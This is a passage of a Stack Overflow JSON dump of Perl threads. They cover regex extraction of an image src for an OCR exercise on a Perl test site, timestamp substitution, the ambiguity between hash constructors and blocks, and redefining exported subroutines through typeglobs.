\"(/captcha/[^\"]*)\" is using a capture group to grab anything inside the double quotes that will be the URL. It's also using the \"/s\" modifier on the end which will treat <code>$html</code> as if it is just one long line of text and ignoring any <code>\\n</code> in it which probably isn't needed, but on the off chance the img tag is split over multiple lines it'll still work.</p>\n"}], "owner": {"reputation": 2024, "user_id": 9461974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb35846c1f8d76ead6415a2a5db58d76?s=128&d=identicon&r=PG&f=1", "display_name": "Oysiyl", "link": "https://stackoverflow.com/users/9461974/oysiyl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 563, "favorite_count": 0, "accepted_answer_id": 51616182, "answer_count": 1, "score": 0, "last_activity_date": 1533052368, "creation_date": 1533046327, "last_edit_date": 1533048434, "question_id": 51615451, "link": "https://stackoverflow.com/questions/51615451/use-regular-expression-to-extract-img-tag-from-html-in-perl", "title": "Use regular expression to extract img tag from HTML in Perl", "body": "<p>I need to extract captcha from url and recognised it with Tesseract.\nMy code is:</p>\n\n<pre><code>#!/usr/bin/perl -X\n###\n$user = 'user'; #Enter your username here\n$pass = 'pass'; #Enter your password here\n###\n#Server settings\n$home = \"http://perltest.adavice.com\";\n$url = \"$home/c/test.cgi?u=$user&amp;p=$pass\";\n###Add code here!\n#Grab img from HTML code\n#if ($html =~ /&lt;img. *?src. *?&gt;/)\n#{\n#    $img1 = $1;\n#}\n#else \n#{\n#    $img1 = \"\";\n#}\n$img2 = grep(/&lt;img. *src=.*&gt;/,$html);\nif ($html =~ /\\img[^&gt;]* src=\\\"([^\\\"]*)\\\"[^&gt;]*/)\n{\n    my $takeImg = $1;\n    my @dirs = split('/', $takeImg);\n    my $img = $dirs[2];\n}\nelse\n{\n    print \"Image not found\\n\";\n}\n###\ndie \"&lt;img&gt; not found\\n\" if (!$img);\n#Download image to server (save as: ocr_me.img)\nprint \"GET '$img' &gt; ocr_me.img\\n\";\nsystem \"GET '$img' &gt; ocr_me.img\";\n###Add code here!\n#Run OCR (using shell command tesseract) on img and save text as ocr_result.txt\nsystem(\"tesseract ocr_me.img ocr_result\");\nprint \"GET '$txt' &gt; ocr_result.txt\\n\";\nsystem \"GET '$txt' &gt; ocr_result.txt\";\n###\ndie \"ocr_result.txt not found\\n\" if (!-e \"ocr_result.txt\");\n# check OCR results:\n$txt = 'cat ocr_result.txt';\n$txt =~ s/[^A-Za-z0-9\\-_\\.]+//sg;\n$img =~ s/^.*\\///;\nprint `echo -n \"file=$img&amp;text=$txt\" | POST \"$url\"`;\n</code></pre>\n\n<p>As you see I`m trying extract img src tag. This solution did not work for me ($img1) <a href=\"https://stackoverflow.com/questions/29321827/use-shell-command-tesseract-in-perl-script-to-print-a-text-output\">use shell command tesseract in perl script to print a text output</a>. Also I used adopted version of that solution($img2) <a href=\"https://stackoverflow.com/questions/254345/how-can-i-extract-url-and-link-text-from-html-in-perl\">How can I extract URL and link text from HTML in Perl?</a>.</p>\n\n<p>If you need HTMLcode from that page, here is:</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Perl test&lt;/title&gt;\n&lt;/head&gt;\n&lt;body style=\"font: 18px Arial;\"&gt;\n&lt;nobr&gt;somenumbersimg src=\"/JJ822RCXHFC23OXONNHR.png\" \nsomenumbers&lt;img src=\"/captcha/1533030599.png\"/&gt;\nsomenumbersimg src=\"/JJ822RCXHFC23OXONNHR.png\" &lt;/nobr&gt;&lt;br/&gt;&lt;br/&gt;&lt;form method=\"post\" action=\"?u=user&amp;p=pass\"&gt;User: &lt;input name=\"u\"/&gt;&lt;br/&gt;PW: &lt;input name=\"p\"/&gt;&lt;br/&gt;&lt;input type=\"hidden\" name=\"file\" value=\"1533030599.png\"/&gt;Text: &lt;input name=\"text\"&gt;&lt;/br&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;br/&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>I got error that image not found. My problem is wrong regular expression, as I think.I can not install any modules such as HTTP::Parser or similar</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 1515, "user_id": 7189767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c979c9b4f88620e8ddbf74fb6a83824?s=128&d=identicon&r=PG&f=1", "display_name": "Fallenhero", "link": "https://stackoverflow.com/users/7189767/fallenhero"}, "edited": false, "score": 1, "creation_date": 1533046578, "post_id": 51615429, "comment_id": 90196368, "body": "<code>[0-9]+8</code> does not mean 8 digits but 1 or more digits followed by 8. you want <code>[0-9]{8}</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1533046634, "post_id": 51615429, "comment_id": 90196396, "body": "There&#39;s nothing special about <code>&quot;</code>. You don&#39;t even need to escape it."}], "answers": [{"comments": [{"owner": {"reputation": 575, "user_id": 2413767, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/9380d059e6b721c893f451abd941fcd1?s=128&d=identicon&r=PG", "display_name": "John", "link": "https://stackoverflow.com/users/2413767/john"}, "edited": false, "score": 0, "creation_date": 1533047946, "post_id": 51615532, "comment_id": 90197336, "body": "Perfect. Thanks."}, {"owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "edited": false, "score": 0, "creation_date": 1533052051, "post_id": 51615532, "comment_id": 90200252, "body": "Note that \\d will match more than [0-9] as it matches any decimal number which as of Unicode version 9.0 is 580 characters"}], "tags": [], "owner": {"reputation": 3388, "user_id": 9534819, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0fdbae473f8d26eb6a10d85ab897e91e?s=128&d=identicon&r=PG&f=1", "display_name": "Matt.G", "link": "https://stackoverflow.com/users/9534819/matt-g"}, "is_accepted": true, "score": 0, "last_activity_date": 1533046575, "creation_date": 1533046575, "answer_id": 51615532, "question_id": 51615429, "link": "https://stackoverflow.com/questions/51615429/regex-match-with-perl-with-quotation-marks/51615532#51615532", "title": "regex match with perl with quotation marks", "body": "<p>Try Regex: <code>(?&lt;=TIME=\")\\d{8}\\.\\d{7}(?=\")</code></p>\n\n<p><a href=\"https://regex101.com/r/BbI6KC/1\" rel=\"nofollow noreferrer\">Demo</a></p>\n"}, {"tags": [], "owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "is_accepted": false, "score": 0, "last_activity_date": 1533051639, "creation_date": 1533051639, "answer_id": 51617239, "question_id": 51615429, "link": "https://stackoverflow.com/questions/51615429/regex-match-with-perl-with-quotation-marks/51617239#51617239", "title": "regex match with perl with quotation marks", "body": "<p>Try this which may be quicker</p>\n\n<pre><code>$line =~ s/TIME=\"[0-9]{8}\\.[0-9]{7}\"/TIME=\"00000000.0000000\"/g\n</code></pre>\n\n<p>Note as mentioned in the comments to your question you need {8} and {7} not +8 and +7 also <code>\"</code> is not special in either side of <code>s///</code>.</p>\n\n<p>However <code>.</code> is special and needs escaping; also you don't need <code>( ... )</code> unless you want to use the original time stamp outside the regex</p>\n"}], "owner": {"reputation": 575, "user_id": 2413767, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/9380d059e6b721c893f451abd941fcd1?s=128&d=identicon&r=PG", "display_name": "John", "link": "https://stackoverflow.com/users/2413767/john"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "accepted_answer_id": 51615532, "answer_count": 2, "score": 0, "last_activity_date": 1533051639, "creation_date": 1533046285, "question_id": 51615429, "link": "https://stackoverflow.com/questions/51615429/regex-match-with-perl-with-quotation-marks", "title": "regex match with perl with quotation marks", "body": "<p>I am reading in a file and I want to find a timestamp value and replace it with 0's before outputting it to another file. So I am trying to search and replace this value TIME=\"20180731.5622743\"\nfor something like this in a file\nTIME=\"00000000.0000000\"</p>\n\n<p>So far i've got..</p>\n\n<pre><code>open(INPUT, $path) or die $!;\nopen(OUTPUT, \"&gt;$susex_path\")  or die $!;\n\nwhile(&lt;INPUT&gt;){\n   $line =~ s/([0-9]+8.[0-9]+7)/000000.0000000/g;\n   print OUTPUT $line;\n   }\n}\nclose(INPUT);    \nclose(OUTPUT);\n</code></pre>\n\n<p>The search and replace only partially works as the line contains other timestamps that I don't want to replace. If I include the full bit to search and replace the quotation marks appear to be preventing a successful search and replace.. e.g(</p>\n\n<pre><code>$line =~ s/TIME=\\\"([0-9]+8.[0-9]+7)\\\"/TIME=\\\"00000000.0000000\\\"/g\n</code></pre>\n\n<p>Any help is much appreciated</p>\n"}, {"tags": ["hashmap", "perl"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1533041148, "post_id": 51613242, "comment_id": 90192632, "body": "I was going to write an answer to the effect that it&#39;s a context problem. But for all it&#39;s a bit icky style, <code>f()</code> does return a hashref, but <code>g()</code> returns a list. I think it must be to do with the unpacking <code>%{f()]</code> causing a return in a list context."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 602, "user_id": 8364542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fcd327ab0741e66abc506ffdb126975?s=128&d=identicon&r=PG&f=1", "display_name": "hoffmeister", "link": "https://stackoverflow.com/users/8364542/hoffmeister"}, "edited": false, "score": 1, "creation_date": 1533041983, "post_id": 51613242, "comment_id": 90193190, "body": "@hoffmeister: You haven&#39;t explained why <code>Data::Dumper</code> works with one function but not the other. This is clear, because <code>%{ f() }</code> works fine,"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1533047565, "post_id": 51613242, "comment_id": 90197055, "body": "Quasi-duplicate of <a href=\"https://stackoverflow.com/q/42100478/589924\">Difference between returning +{} or {} in perl from a function, and return ref or value</a>"}, {"owner": {"reputation": 602, "user_id": 8364542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fcd327ab0741e66abc506ffdb126975?s=128&d=identicon&r=PG&f=1", "display_name": "hoffmeister", "link": "https://stackoverflow.com/users/8364542/hoffmeister"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1533050806, "post_id": 51613242, "comment_id": 90199396, "body": "@ikegami , you&#39;re right, i did not realise that perl sees it as a code block, not a reference. However, i do not think you&#39;re answer makes it clear from a sub-routine you can either return a single variable or a list. So here when we call g() Data::Dumper it prints a list. I&#39;ve only known data::dumper to print a hash if you pass a reference, hence why we need to make it a hash reference somehow. let me know if you want me to delete my initial comment"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 602, "user_id": 8364542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fcd327ab0741e66abc506ffdb126975?s=128&d=identicon&r=PG&f=1", "display_name": "hoffmeister", "link": "https://stackoverflow.com/users/8364542/hoffmeister"}, "edited": false, "score": 1, "creation_date": 1533053080, "post_id": 51613242, "comment_id": 90200915, "body": "@hoffmeister, I don&#39;t see the point of explaining that subs can return multiple scalars (and neither did Borodin, for that matter). The problem is that <code>{ }</code> isn&#39;t doing what it&#39;s expected to be doing. I explained why that&#39;s the case, and how to fix it."}], "answers": [{"comments": [{"owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "edited": false, "score": 1, "creation_date": 1533073018, "post_id": 51613959, "comment_id": 90210197, "body": "Are <code>foo&#47;bar</code> really better function names than <code>f&#47;g</code> ? I mean, none are a good name for a real code, but for a minimal example, <code>f</code> and <code>g</code> seem fine to me.."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "edited": false, "score": 1, "creation_date": 1533117096, "post_id": 51613959, "comment_id": 90224721, "body": "@Dada: There is a reason why the community settled on <code>foo</code>, <code>bar</code>, and <code>baz</code> instead of <code>f</code>, <code>g</code>, and <code>h</code>. Shorter names will always be preferred without another overriding reason (which is why the more common Perl language words are also generally the shorter ones). The problem is that single-letter identifiers tend to &quot;disappear&quot; into the the surrounding symbols, so <code>%{foo()}</code> is much clearer than <code>%{f()}</code>."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 9, "last_activity_date": 1533041876, "creation_date": 1533041876, "answer_id": 51613959, "question_id": 51613242, "link": "https://stackoverflow.com/questions/51613242/perl-hashes-dont-work-as-expected/51613959#51613959", "title": "Perl hashes don&#39;t work as expected", "body": "<p>The problem is that a pair of braces is ambiguous in Perl, and may be either a block or an anonymous hash</p>\n\n<p>Because of the contents of the hash in your <code>g</code> (please use better names) perl has assumed that you are writing a code block, which is just a list of scalar values</p>\n\n<p>Make it more explicit like this and your code will function as you expect</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nsub foo {\n    {\n        a =&gt; 1,\n        b =&gt; 2,\n    }\n}\n\nsub bar {\n    my $href = {\n        %{ foo() },\n        c =&gt; 3,\n        d =&gt; 4,\n    }\n}\n\nuse Data::Dump;\ndd bar();\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>{ a =&gt; 1, b =&gt; 2, c =&gt; 3, d =&gt; 4 }\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 7, "last_activity_date": 1533049440, "last_edit_date": 1533049440, "creation_date": 1533047505, "answer_id": 51615859, "question_id": 51613242, "link": "https://stackoverflow.com/questions/51613242/perl-hashes-dont-work-as-expected/51615859#51615859", "title": "Perl hashes don&#39;t work as expected", "body": "<p>The Perl language has ambiguities. Take for example</p>\n\n<pre><code>sub some_sub {\n   {  }     # Is this a hash constructor or a block?\n}\n</code></pre>\n\n<p><code>{ }</code> is valid syntax for a block (\"bare loop\").<br>\n<code>{ }</code> is valid syntax for a hash constructor.<br>\nAnd both are allowed as a statement!</p>\n\n<p>So Perl has to guess. Perl usually guesses correctly, but not always. In your case, it guessed correctly for <code>f()</code>, but not for <code>g()</code>.</p>\n\n<p>To fix this, you can give Perl \"hints\". Unary-<code>+</code> can be used to do this. Unary-<code>+</code> is a completely transparent operator; it does nothing at all. However, it must be followed by an expression (not a statement). <code>{ }</code> has only one possible meaning as an expression.</p>\n\n<pre><code>+{ }   # Must be a hash constructor.\n</code></pre>\n\n<p>Similarly, you can trick Perl to guess the other way.</p>\n\n<pre><code>{; }   # Perl looks ahead, and sees that this must be a block.\n</code></pre>\n\n<p>So in this case, you could use</p>\n\n<pre><code>sub g { +{\n  %{f()},\n  c =&gt; 3,\n  d =&gt; 4,\n} }\n</code></pre>\n\n<p>or</p>\n\n<pre><code>sub g { return {\n  %{f()},\n  c =&gt; 3,\n  d =&gt; 4,\n} }\n</code></pre>\n\n<p>(<code>return</code> must also be followed by an expression if anything.)</p>\n"}], "owner": {"reputation": 4450, "user_id": 856090, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/fa49a1c90a6af7544d764c5b22ff780d?s=128&d=identicon&r=PG", "display_name": "porton", "link": "https://stackoverflow.com/users/856090/porton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 104, "favorite_count": 0, "accepted_answer_id": 51613959, "answer_count": 2, "score": 2, "last_activity_date": 1533049440, "creation_date": 1533039535, "question_id": 51613242, "link": "https://stackoverflow.com/questions/51613242/perl-hashes-dont-work-as-expected", "title": "Perl hashes don&#39;t work as expected", "body": "<pre><code>#!/usr/bin/perl\n\nsub f { {\n  a =&gt; 1,\n  b =&gt; 2\n} }\n\nsub g { {\n  %{f()},\n  c =&gt; 3,\n  d =&gt; 4,\n} }\n\nuse Data::Dumper;\nprint Dumper g();\n</code></pre>\n\n<p>The above code outputs</p>\n\n<pre><code>$VAR1 = 'a';\n$VAR2 = 1;\n$VAR3 = 'b';\n$VAR4 = 2;\n$VAR5 = 'c';\n$VAR6 = 3;\n$VAR7 = 'd';\n$VAR8 = 4;\n</code></pre>\n\n<p>despite in my understanding it should output</p>\n\n<pre><code>$VAR1 = {\n          'a' =&gt; 1,\n          'c' =&gt; 3,\n          'b' =&gt; 2,\n          'd' =&gt; 4\n        };\n</code></pre>\n\n<p>What is my misunderstanding?</p>\n"}, {"tags": ["perl", "typeglob"], "answers": [{"comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1533036890, "post_id": 51610970, "comment_id": 90189535, "body": "Good explanation, I might just add that the &quot;imported version of <code>read_file</code>&quot; (the OP called it <i>&quot;short name&quot;</i>) is <code>main::read_file</code>, i.e. there&#39;s nothing really special about it - it&#39;s just a regular symbol table entry too, in the default <code>package main</code>."}, {"owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533037084, "post_id": 51610970, "comment_id": 90189653, "body": "I thought about that but decided that there was nothing in the examples to show if they where in the main:: package or in another package, so I wrote it without showing the package the symbol was imported into"}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533037778, "post_id": 51610970, "comment_id": 90190117, "body": "True. I just didn&#39;t want to leave the impression that there&#39;s something particularly  &quot;magic&quot; about importing or about &quot;short names&quot; (stuff in the default/current package), hence my comment."}, {"owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1533037937, "post_id": 51610970, "comment_id": 90190211, "body": "Fair enough :-)"}], "tags": [], "owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "is_accepted": false, "score": 6, "last_activity_date": 1533065203, "last_edit_date": 1533065203, "creation_date": 1533032092, "answer_id": 51610970, "question_id": 51610058, "link": "https://stackoverflow.com/questions/51610058/redefine-perl-function-using-typeglob-doesnt-work-as-expected/51610970#51610970", "title": "Redefine perl function using typeglob doesn&#39;t work as expected", "body": "<p>Your problem is caused by how the way export works. and how Perl assigns names to values. In Perl each name is a link to a value so <code>sub read_line { ... }</code> creates an anonymous subroutine reference and assigns it to the name <code>&amp;read_line</code></p>\n\n<pre><code>use File::Slurp qw(read_file);\nlocal *File::Slurp::read_file = sub {\n    return 'test';\n};\n</code></pre>\n\n<p>In your first example you are overriding <code>File::Slurp::read_file</code> and then calling <code>File::Slurp::read_file</code> so you get your version of <code>File::Slurp::read_file</code>. </p>\n\n<pre><code>use File::Slurp qw(read_file);\nlocal *read_file = sub {\n    return 'test';\n};\n</code></pre>\n\n<p>In your second example you are overriding your imported version of <code>read_file</code> and then calling that so you get your version of <code>read_file</code></p>\n\n<pre><code>use File::Slurp qw(read_file);\nlocal *File::Slurp::read_file = sub {\n    return 'test';\n};\n</code></pre>\n\n<p>In your third example the following happens:</p>\n\n<p><code>use File::Slurp;</code> does a <code>*read_file = \\&amp;File::Slurp::read_file</code> at compile time, which makes <code>read_file</code> point to the existing version of <code>File::Slurp::read_file</code>. Your code then assigns <code>*File::Slurp::read_file</code> a new sub ref, however this does not change <code>read_file</code> and it still points to the sub ref that <code>File::Slurp::read_file</code> originally pointed to. You then call <code>read_file</code> which is pointing to the original imported version of <code>File::Slurp::read_file</code></p>\n\n<p>In your fourth example Perl's method resolution system means that you are calling <code>LWP::UserAgent::get</code> so this is equivalent to your first example.</p>\n"}, {"comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1533033020, "post_id": 51610974, "comment_id": 90187051, "body": "Does this work for you if you replace <code>Cwd</code> with <code>File::Slurp</code>? Strangely, I cannot get it to work with <code>File::Slurp</code>.."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1533033820, "post_id": 51610974, "comment_id": 90187589, "body": "@H&#229;konH&#230;gland You are right, it doesn&#39;t -- thank you. It&#39;s much too late here so I&#39;m removing this for now."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1533064266, "post_id": 51610974, "comment_id": 90206394, "body": "@H&#229;konH&#230;gland Edited to address that, thank you.  I cannot see what in these modules makes that difference, and I find some more subtle behavior which I don&#39;t get. So the only fix I see is to explicitly set names in all needed namespaces."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1533105375, "post_id": 51610974, "comment_id": 90217944, "body": "@PaulSerikov Edited, and added a possibly reasonable way to do what you want"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 1, "last_activity_date": 1565254524, "last_edit_date": 1565254524, "creation_date": 1533032100, "answer_id": 51610974, "question_id": 51610058, "link": "https://stackoverflow.com/questions/51610058/redefine-perl-function-using-typeglob-doesnt-work-as-expected/51610974#51610974", "title": "Redefine perl function using typeglob doesn&#39;t work as expected", "body": "<p>When a sub is exported its reference is written to the caller's symbol table.  Apparently, after you redefine the sub in module the unqualified name in the caller still refers to the \"old\" one, that was Exported, and not the redefined one.</p>\n\n<p>One clear fix is to explicitly alias the (unqualified) name in the calling package</p>\n\n<pre><code>*func = *Module::func = sub { ... };\n</code></pre>\n\n<p>Then wrap this in a subroutine, from which all wanted namespaces can be taken care of</p>\n\n<pre><code>sub redefine_sub {\n    my ($fqn, $code) = @_;\n\n    no warnings 'redefine';  # these pragmas are lexical, and\n    no strict 'refs';        # so stay scoped to this sub only\n\n    *{ $fqn } = $code;\n\n    # Redefine in caller\n    my ($name) = $fqn =~ /.*::(.*)/;\n    my $to_caller = caller() . '::' . $name;\n    *{ $to_caller } = $code;\n}\n</code></pre>\n\n<p>In the caller</p>\n\n<pre><code>use Module qw(func);\n\nredefine_sub('Module::func', sub { ... });\n</code></pre>\n\n<hr>\n\n<p><em>A few original attempts, kept here as they may appear reasonable but don't work</em></p>\n\n<p>One may think (or, I did) that switching the order of definitions should work</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nBEGIN {                      # must come first, in BEGIN block\n    no warnings 'redefine';\n    *Cwd::cwd = sub { return 'impostor' }; \n};\n\nuse Cwd;\n\nsay \"cwd(): \", cwd();\n</code></pre>\n\n<p>This indeed prints <code>impostor</code>.  However, worse than requiring a specific order of definitions and not allowing for <code>local</code> any more, this also <em>does not work for <code>File::Slurp</code></em>.   I don't see what makes that difference in sources of these modules.</p>\n\n<p>It does work with a simple-minded, plain module defined <em>in the same file</em></p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nBEGIN {\n    package TestRedef;    \n    use Exporter qw(import);    \n    our @EXPORT = qw(hi);\n\n    sub hi { return \"\\thi from \" . __PACKAGE__; }\n\n    $INC{'TestRedef.pm'} = 1;\n};\n\n###  in main::\n\nBEGIN {\n    no warnings 'redefine';\n    *TestRedef::hi = sub { return 'impostor in ' . __PACKAGE__ };\n};\n\nuse TestRedef;\n\nsay hi();\n</code></pre>\n\n<p>but it again doesn't work if this package is given in a separate file.</p>\n"}], "owner": {"reputation": 1445, "user_id": 1441592, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/2a58917def8d1523a840b52ae7d59d21?s=128&d=identicon&r=PG", "display_name": "Paul Serikov", "link": "https://stackoverflow.com/users/1441592/paul-serikov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 208, "favorite_count": 0, "answer_count": 2, "score": 4, "last_activity_date": 1565254524, "creation_date": 1533029424, "last_edit_date": 1533030486, "question_id": 51610058, "link": "https://stackoverflow.com/questions/51610058/redefine-perl-function-using-typeglob-doesnt-work-as-expected", 